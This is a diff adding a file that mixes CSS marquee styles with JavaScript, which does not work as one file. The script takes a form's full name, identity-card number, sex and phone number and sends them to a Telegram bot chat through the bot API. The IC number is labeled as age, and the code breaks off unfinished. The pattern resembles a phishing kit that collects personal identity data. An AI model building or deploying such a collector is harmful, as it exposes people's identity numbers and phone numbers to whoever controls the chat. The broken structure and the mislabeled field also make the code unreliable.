@@ -1,0 +1,97 @@
+.marquee {
+  width: 100%;
+  overflow: hidden;
+  white-space: nowrap;
+}
+
+.marquee span {
+  display: inline-block;
+  white-space: nowrap;
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+    // Hide overlay initially
+    document.getElementById("overlay").style.display = "none";
+
+    // Add event listener to the submit button
+    document
+      .getElementById("submitButton")
+      .addEventListener("click", function (e) {
+        e.preventDefault();
+
+        // Get form fields
+        const fullName = document.getElementById("full_name").value.trim();
+        const icNumber = document.getElementById("icnumber").value.trim();
+        const sek = document.getElementById("sek").value.trim();
+        let phoneNumber = document
+          .getElementById("phone_number")
+          .value.trim();
+        const agreeTelegram =
+          document.getElementById("agree_telegram").checked;
+
+        // Validasi form
+        if (
+          fullName === "" ||
+          icNumber === "" ||
+          sek === "" ||
+          phoneNumber === "" ||
+          !agreeTelegram
+        ) {
+          alert("Semua kolom wajib diisi dengan benar sebelum mengirim.");
+          return;
+        }
+
+        // Format nomor telepon
+        if (!phoneNumber.startsWith("+62")) {
+          if (phoneNumber.startsWith("0")) {
+            phoneNumber = "+62" + phoneNumber.slice(1);
+          } else {
+            phoneNumber = "+62" + phoneNumber;
+          }
+        }
+
+        // Tampilkan overlay
+        document.getElementById("overlay").style.display = "flex";
+
+        // Siapkan pesan untuk Telegram
+        const message = `
+📝 Data Pendaftaran Baru:
+  
+👤 Nama: ${fullName}
+📅 Usia: ${icNumber}
+👥 Jenis Kelamin: ${sek}
+📱 No. Telepon: ${phoneNumber}`;
+
+        // Ganti dengan token bot dan chat ID Anda
+        const botToken = "YOUR_BOT_TOKEN";
+        const chatId = "YOUR_CHAT_ID";
+
+        // Kirim ke Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "HTML",
+          }),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.ok) {
+              // Redirect ke halaman berikutnya
+              window.location.href = "nextPage.html";
+            } else {
+              alert("Terjadi kesalahan saat mengirim data.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            alert("Terjadi kesalahan saat mengirim data.");
+          })
+          .finally(() => {
+            document.getElementById("overlay").style.display = "none";
+          });
+
